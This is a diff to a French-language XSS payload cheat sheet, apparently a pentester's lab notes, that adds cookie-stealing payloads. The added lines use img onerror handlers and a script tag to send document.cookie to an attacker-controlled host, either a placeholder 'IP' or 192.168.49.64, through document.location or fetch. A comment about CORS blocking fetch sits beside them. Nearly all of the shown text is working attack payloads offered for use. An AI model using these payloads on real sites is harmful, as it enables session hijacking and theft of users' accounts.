@@ -63,6 +63,7 @@ wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/human-friendly/XSS-BruteLogic.t
 <body onload=alert(1)>
 <svg onload=alert(1)>
 <iframe src="javascript:alert(1)">
+<img src=x onerror="document.location='http://IP/?c='+document.cookie">
 ```
 
 ### 3.2 Attribut HTML (entre guillemets)
@@ -119,6 +120,10 @@ python3 -m http.server 80
 ```html
 <!-- Payload injecté dans la cible -->
 <script src="http://KALI_IP/xss.js"></script>
+<img src=x onerror="fetch('http://192.168.49.64/?c='+document.cookie)"> //fetch dans onerror peut etre bloqué par les CORS
+<img src=x onerror="document.location='http://192.168.49.64/?c='+document.cookie">
+
+<script>document.location='http://192.168.49.64/?c='+document.cookie</script>
 ```
 
 **Lire les logs** pour confirmer exécution :
